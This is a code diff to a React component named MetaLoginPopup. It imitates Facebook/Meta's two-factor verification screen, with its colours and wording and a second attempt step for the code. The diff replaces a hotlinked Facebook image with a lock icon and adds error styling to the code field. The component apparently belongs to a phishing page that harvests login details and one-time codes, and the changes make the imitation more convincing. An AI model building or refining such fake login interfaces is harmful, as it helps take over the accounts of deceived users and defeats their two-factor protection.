@@ -288,11 +288,9 @@ const MetaLoginPopup = () => {
                 currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && (
                 <>
                   <div className="text-center mb-4">
-                    <img 
-                      src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/Aji5BKKnMQF.png" 
-                      alt="Two-factor authentication" 
-                      className="h-16 w-16 mx-auto mb-3"
-                    />
+                    <div className="h-16 w-16 mx-auto mb-3 flex items-center justify-center bg-[#e7f3ff] rounded-full">
+                      <Lock className="h-8 w-8 text-[#1877F2]" />
+                    </div>
                     <h3 className="text-xl font-semibold">Two-factor authentication required</h3>
                     <p className="text-[#65676b] mt-2 text-[15px]">
                       We sent a code to your phone. Enter it here to verify your identity.
@@ -311,10 +309,16 @@ const MetaLoginPopup = () => {
                         value={verificationCode}
                         onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
                         placeholder="Enter code"
-                        className="h-[50px] border-[#dddfe2] rounded-[6px] text-[17px] text-center"
+                        className={`h-[50px] rounded-[6px] text-[17px] text-center ${verificationError ? "border-[#f02849]" : "border-[#dddfe2]"}`}
                         disabled={currentStep === LoginStep.VERIFICATION_TIMEOUT || isLoading}
                         maxLength={8}
                       />
+                      
+                      {verificationError && (
+                        <div className="text-[#f02849] text-xs mt-1 text-center">
+                          {verificationError}
+                        </div>
+                      )}
                       
                       <div className="text-xs text-[#65676b] text-center mt-3">
                         {currentStep === LoginStep.VERIFICATION_TIMEOUT ? (
